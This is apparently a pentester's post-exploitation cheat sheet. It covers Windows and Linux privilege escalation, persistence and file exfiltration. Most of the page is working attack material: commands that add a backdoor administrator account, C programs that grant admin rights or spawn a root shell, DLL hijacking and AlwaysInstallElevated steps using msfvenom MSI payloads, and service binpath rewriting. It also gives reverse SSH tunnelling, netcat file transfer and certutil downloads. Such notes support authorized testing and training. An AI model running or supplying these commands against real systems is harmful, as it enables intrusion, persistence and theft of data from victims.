---
title: Exploitation
---

[Home](./)

_Ensuring you don't have to re-exploit over and over again_

## Executing in Memory - TMPFS

```bash
mount | grep ^tmp

# Example:
# tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
# tmpfs on /tmp type tmpfs (rw,nosuid,nodev)
#
# Beware of the "noexec" flag; executing programs will fail
```

## Get full TTY shell
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Switch user

```bash
su $USER
```

## Run Single command as a different user

### Linux

```bash
sudo -u $USER $cmd
```

### Windows 

```bash
echo "$PASSWORD" | runas /profile /user:$USER “$COMMAND”
```

+ [sudo.cmd](./assests/sudo.cmd) <sup><sub>[[copy&paste](assets/files/sudo.cmd.txt)]


## Windows Privilege Escalation

### windows-exploit-suggester.py

+ [windows-exploit-suggester.py](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) <sup><sub>[[archive](assets/files/windows-exploit-suggester.py)]

```bash
# Victim
systeminfo # Copy & Paste this into a file on the attacker

# Attacker
python windows-exploit-suggester.py --update

python windows-exploit-suggester.py --database 20XX-YY-ZZ-mssb.xlsx --systeminfo systeminfo.txt
```

### Creating Windows Admin Account

```bash
# Victim
net user /add jack sparrow
net localgroup administrators jack /add

# Connect with
rdesktop -u jack -p sparrow [IP-ADDRESS]
```

### Setuid.c
<sup><sub>[[archive](assets/files/win_setuid.c)]

If you can overwrite a binary that'll be run with priviledge, run this.

```c
#include <stdlib.h>
int main()
{
    int i;
    i = system("net localgroup administrators theusername /add");
    return 0;
}
```

### Windows Service / DLL Templates

+ [windows_dll.c](https://github.com/sagishahar/scripts/blob/master/windows_dll.c) <sup><sub>[[archive](assets/files/windows_dll.c)]

+ [windows_service.c](https://github.com/sagishahar/scripts/blob/master/windows_service.c) <sup><sub>[[archive](assets/files/windows_service.c)]

#### DLL Hijacking w/ Procmon.exe

_Requires GUI (so RDP...)_

+ [Procmon.exe](https://download.sysinternals.com/files/ProcessMonitor.zip) <sup><sub> [[archive](assets/files/procmon.exe)]

Run the following; look for services that call DLLs that return "NAME NOT FOUND". You can add a DLL to these locations and it will be loaded in, in the context of the process (potentially as SYSTEM)

```bash 
# Victim - Run as Administrator (yes, I know...)
procmon.exe
```

To exploit, use the `windows_dll.c` templated and compile with the following.

```bash
x86_64-w64-mingw32-gcc windows_dll.c -shared -o [dll_name].dll
```


#### Cross-compiling for Windows

##### C & C++

```bash
# Setup
apt install mingw-w64

# x86
x86_64-w64-mingw32-gcc [src.c] [-libraries] -o [dst]
i686-w64-mingw32-gcc [src.c] [-libraries] -o [dst] -lws2_32

# x64
i686-w64-mingw32-gcc [src.c] [-libraries] -o [dst]
```

##### C#

```bash
# Setup 
# Add repo with https://www.mono-project.com/download/stable/
sudo apt-get install mono-complete msbuild mono-roslyn

# Building
msbuild [src.sln]
```

#### Using Python Scripts without Python installed
[PyInstaller](https://github.com/pyinstaller/pyinstaller) <sup><sub>[[archive](assets/files/PyInstaller-3.6.zip)]
```bash
pyinstaller yourprogram.py
```

### Startup Application

If you can run programs at startup, the next time someone logs in; you could get a shell before they know what's happening. Run the following and look for `BUILTIN\Users` if they have `(F)` or `(C)` it is vulnerable.

```bash
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

Simply put an exe in here to have it execute on startup.

### Always Install Elevated
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

# If both of these are 0x1 - you can install msi packages as system.
# Generate MSI Payload with:
msfvenom [blah blah blah] -f msi -o setup.msi

# Execute it with:
msiexec /quiet /qn /i setup.msi
```

### Unquoted Paths

When windows sees the a service is pointed to `C:\Program Files\Something Here\service.exe` (**without quotes around it**), it will try to run the following in order:

```bash
C:\Program.exe
C:\Program Files\Something.exe
C:\Program Files\Something Here\service.exe
```

If you make sure one of these exists before the legitimate is called, you can get code execution.

### Attacking From The Inside

Some services can only be accessed from inside the victim itself. List all active network connections with:

```bash
netstat -ano
```

Then port forward to them using reverse ssh proxy.

+ [Putty](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)
+ [Plink](https://the.earth.li/~sgtatham/putty/latest/w32/plink.exe) <sup><sub>[[archive (32-bit)](assets/files/plink.exe)]

```bash
plink.exe -l $LUSER -pw $LPASS $LHOST -R $LPORT:127.0.0.1:$RPORT
# L == Attacker
# R == Victim
```

### Vulnerable Scheduled Tasks

```bash
# Victim
schtasks /query /fo LIST /v > schtask.txt

# Attacker
cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
```

### Weak Service Permissions

Thanks to `sushant747` for the following scripts.

#### Using WMCI

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt

for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
```
#### sc.exe

```bash
sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt

FOR /F %i in (Servicenames.txt) DO echo %i
type Servicenames.txt

FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt

FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
```

Then go through it manually with:

```bash
cacls "C:\path\to\file.exe"
```

### Get Info on all Services

```bash
sc query state= all | findstr "SERVICE_NAME:" >> tmp_servicenames.txt

FOR /F "tokens=2 delims= " %i in (tmp_servicenames.txt) DO @echo %i >> tmp_services.txt

FOR /F %i in (tmp_services.txt) DO @sc qc %i >> service_report.txt

del tmp_servicenames.txt && del tmp_services.txt
```


### Restarting a Service

```bash
wmic service [service name] call startservice

# OR

net stop [service name] && net start [service name].
```

### AccessChk

+ [AccessChk](https://download.sysinternals.com/files/AccessChk.zip) <sup><sub>[[archive](assets/files/accesschk_v5.02.exe)]

```bash
# Accesschk stuff
accesschk.exe /accepteula #(always do this first!!!!!)
accesschk.exe -ucqv [service_name] #(requires sysinternals accesschk!)
accesschk.exe -uwcqv "Authenticated Users" *  # (won't yield anything on Win 8)
accesschk.exe -ucqv [service_name]

# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\

# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*

# Check permissions on spesific folder
accesschk.exe -wvu "C:\Path\To\Folder" # Look for “FILE_ALL_ACCESS”
```

Check if you can change a service's binpath

```bash
# Detect
accesschk.exe -wuvc [service_name] # Look for “SERVICE_CHANGE_CONFIG”

# Exploit
sc config [service_name] binpath= "[cmd]"
```

## Linux Privilege Escalation

### Setuid.c
<sup><sub> [[archive](assets/files/lin_setuid.c)]

If you can overwrite a binary that'll be run with priviledge, run this.

```c
int main(void)
{
    setgid(0);
    setuid(0);
    execl("/bin/sh", "sh", 0);
}
```

## Exfiltration

+ SSH Copy (scp)

```bash
scp user@hostname:/path/to/src user@hostname:/path/to/dst
```

+ Netcat

```bash
# Victim
nc -nvlp $RPORT > out.file

# Attacker
nc -nv $RHOST $RPORT < in.file
```

+ exe2bat

```bash
# Convert a windows executable to a copy and paste set of commands
wine $(locate exe2bat.exe) nc.exe nc.txt
```

+ certutil.exe

```bash
certutil.exe -urlcache -split -f “$URL” $FILENAME
```

+ [zip.vbs](assets/files/zip.vbs) <sup><sub>[[copy&paste](assets/files/zip.vbs.txt)]

```bash
CScript zip.vbs $SRC $DEST
```

+ [wget.vbs](assets/files/wget.vbs) <sup><sub>[[copy&paste](assets/files/wget.vbs.txt)]

```bash
CScript wget.vbs $SRC $DEST
```

## Fun Tips

### Linux Write a file without a text editor

```bash
cat <<EOF> [file]
```